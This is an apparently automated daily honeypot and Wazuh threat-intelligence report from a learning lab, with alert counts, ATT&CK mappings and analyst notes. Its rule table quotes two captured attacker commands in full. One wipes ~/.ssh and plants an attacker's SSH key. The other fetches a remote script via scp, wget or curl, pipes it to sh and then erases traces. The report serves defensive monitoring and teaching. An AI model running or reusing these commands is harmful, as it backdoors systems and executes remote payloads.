# LearningLab01 Daily Threat Intelligence Report — 2026-10-25

Generated: 2026-10-25T13:15:05.055Z

Report window: 2026-10-24T13:15:05.030Z through 2026-10-25T13:15:05.030Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 159,267 |
| Attack-related alerts | 16,165 |
| Honeypot interactions | 145,835 |
| Authentication failures | 4,267 |
| Authentication successes | 604 |
| Critical alerts | 362 |
| High alerts | 759 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 362 critical-severity alerts require priority review.
- 759 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 7.06:1.
- Country attribution currently covers only 0.28% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (81,223 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 362 | 0.23% |
| High | 759 | 0.48% |
| Medium | 2,739 | 1.72% |
| Low | 155,407 | 97.58% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 4,267
- Authentication successes: 604
- Failure-to-success ratio: 7.06:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 8,348 | 51.64% |
| Payload delivery | 8,348 | 51.64% |
| Authentication failure | 4,267 | 26.40% |
| Command execution | 2,487 | 15.39% |
| Reconnaissance | 331 | 2.05% |
| Malware | 318 | 1.97% |
| Network scan | 136 | 0.84% |
| SMTP attack | 85 | 0.53% |
| Web attack | 42 | 0.26% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 445 alerts, representing 0.28% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 158,822 | 99.72% | Not geolocated |
| United Kingdom | 205 | 0.13% | ████████████████████ |
| Germany | 111 | 0.07% | ███████████ |
| Bulgaria | 52 | 0.03% | █████ |
| Azerbaijan | 39 | 0.02% | ████ |
| United States | 20 | 0.01% | ██ |
| Hong Kong | 8 | 0.01% | █ |
| China | 3 | 0.00% | █ |
| Australia | 2 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Belgium | 1 | 0.00% | █ |
| Kazakhstan | 1 | 0.00% | █ |
| Russia | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 296 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 85 |
| Execution | 72 |
| Impact | 11 |
| Command and Control | 6 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 85 |
| Command and Scripting Interpreter | 72 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 6 |
| Exploit Public-Facing Application | 5 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 81,223 | T-Pot RDP connection from [IP address] to port 3389. | tpot (81,223) |
| 110207 | 5 | 28,240 | T-Pot SentryPeer SIP activity from [IP address]:62653, method INVITE | tpot (28,240) |
| 110204 | 4 | 21,421 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (21,421) |
| 110205 | 6 | 8,300 | T-Pot Honeytrap received a payload from [IP address] | tpot (8,300) |
| 110101 | 3 | 5,261 | Cowrie SSH connection from [IP address]. | tpot (5,261) |
| 110102 | 5 | 4,267 | Cowrie failed login from [IP address] using username root. | tpot (4,267) |
| 110209 | 5 | 4,029 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (4,029) |
| 110104 | 7 | 2,062 | Cowrie captured a command from [IP address]: uname -a | tpot (2,062) |
| 110201 | 4 | 1,660 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (1,660) |
| 110109 | 13 | 357 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (357) |
| 110219 | 4 | 317 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html HTTP/1.1" 302 - | tpot (317) |
| 110103 | 10 | 313 | Cowrie accepted login from [IP address] using username root. | tpot (313) |
| 110105 | 12 | 245 | Cowrie captured a file download from [IP address]. | tpot (245) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 173 | PAM: Login session closed. | tpot (171), wazuh (2) |
| 110216 | 4 | 139 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (139) |
| 110214 | 9 | 131 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (131) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110106 | 10 | 85 | Cowrie detected repeated failed logins from [IP address]. | tpot (85) |
| 110217 | 7 | 85 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (85) |
| 110221 | 7 | 85 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (85) |
| 110108 | 12 | 67 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (67) |
| 110212 | 10 | 48 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (48) |
| 110220 | 8 | 42 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (42) |
| 110223 | 5 | 42 | T-Pot HoneyAML received  request from  to  on port . | tpot (42) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110215 | 4 | 37 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (37) |
| 110208 | 7 | 24 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:11238 | tpot (24) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 203 | 9 | 6 | Agent event queue is full. Events may be lost. | tpot (6) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 110225 | 13 | 5 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (5) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 110107 | 12 | 1 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (1) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
